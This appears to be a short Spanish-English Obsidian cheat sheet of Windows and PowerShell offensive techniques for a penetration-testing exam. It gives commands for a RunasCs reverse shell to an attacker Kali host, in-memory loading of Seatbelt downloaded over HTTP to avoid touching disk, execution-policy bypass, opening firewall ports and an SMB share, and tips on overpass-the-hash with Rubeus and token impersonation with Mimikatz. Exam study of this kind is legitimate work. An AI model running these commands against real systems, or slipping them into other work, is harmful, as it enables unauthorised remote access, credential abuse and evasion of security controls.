- [[#Create Credential object|Create Credential object]]
- [[#Create PS Drive|Create PS Drive]]
- [[#Run cmd as other user|Run cmd as other user]]
- [[#Interactive Logon|Interactive Logon]]
	- [[#Interactive Logon#Forzar un Logon Type2 con RunasCS|Forzar un Logon Type2 con RunasCS]]
	- [[#Interactive Logon#Tareas programadas locales|Tareas programadas locales]]
	- [[#Interactive Logon#Resumen Táctico para el Examen|Resumen Táctico para el Examen]]
- [[#Create Firewall Rule|Create Firewall Rule]]
- [[#Ejecutar binario en memoria|Ejecutar binario en memoria]]
- [[#Consultar versión de Powershell|Consultar versión de Powershell]]
- [[#Execution Policy|Execution Policy]]

## Create Credential object

```powershell
$password = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("user", $password)
```

## Create PS Drive

```cmd
net use /user:user j: \\ip\smbFolder password
```

```powershell
New-PSDrive -Name J -PSProvider FileSystem -Root "\\ip\smbFolder" -Credential $cred -Persist
```

```bash
sudo smbserver.py -smb2support share . -username user -password password
```

## Run cmd as other user

```cmd
runas /user:backupadmin cmd
```

## Interactive Logon

**Service Control Manager (SCM)** de Windows tiene sus propias listas de control de acceso (DACLs). Cuando te conectas por WinRM, Windows crea un **Logon Type 3 (Network Logon)**, y el SCM capa la enumeración global de servicios para usuarios no administradores bajo este tipo de inicio de sesión.

### Forzar un Logon Type2 con RunasCS

```powershell
.\RunasCs.exe usuario1 Password123! cmd.exe -r TU_IP_KALI:4444
```

### Tareas programadas locales

Las tareas programadas no sufren la restricción de red porque se ejecutan de manera puramente local a nivel de sistema operativo (utilizan **Logon Type 4 / Batch** o se ejecutan directamente como `SYSTEM`). Si tu usuario tiene privilegios para crear una tarea programada, puedes usarla para ejecutar el comando de enumeración y volcar el resultado a un archivo de texto.

```cmd
schtasks /create /tn "EnumServicios" /tr "powershell.exe -Command Get-Service > C:\Windows\Tasks\services.txt" /sc once /st 23:59 /RU "TU_USUARIO"
schtasks /run /tn "EnumServicios"
type C:\Windows\Tasks\services.txt
schtasks /delete /tn "EnumServicios" /f
```

### Resumen Táctico para el Examen

- ¿Tengo la **contraseña en claro** y estoy atrapado en WinRM? Usa **`runascs.exe`** para forzar un Logon Type 2 local.
    
- ¿Solo tengo el **Hash NTLM** y quiero saltarme el Double-Hop de WinRM? Usa **`Rubeus asktgt`** (Overpass-the-Hash) para generar un Logon Type 9.
    
- ¿Soy **Administrador local** pero mi token de WinRM está restringido para la red? Busca procesos de otros usuarios en ejecución e **impersonitas sus tokens** con Mimikatz o Incognito.

## Create Firewall Rule

```powershell
New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```

Disallow

```powershell
Remove-NetFirewallRule -DisplayName "8080-In"
```

## Ejecutar binario en memoria

```powershell
# Ejemplo conceptual para cargar Seatbelt en memoria vía HTTP sin tocar disco:
$bytes = (New-Object System.Net.WebClient).DownloadData('http://<tu-IP-Kali>/Seatbelt.exe')
[System.Reflection.Assembly]::Load($bytes)
[Seatbelt.Program]::Main("all")
```

## Consultar versión de Powershell

Rápido
```powershell
$PSVersionTable.CLRVersion
```

Consulta exacta
```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" -Name Release -ErrorAction SilentlyContinue

```

## Execution Policy

Bypass Execution Policy

```
Set-ExecutionPolicy unrestricted|Bypass
Set-ExecutionPolicy Bypass -Scope Process
```
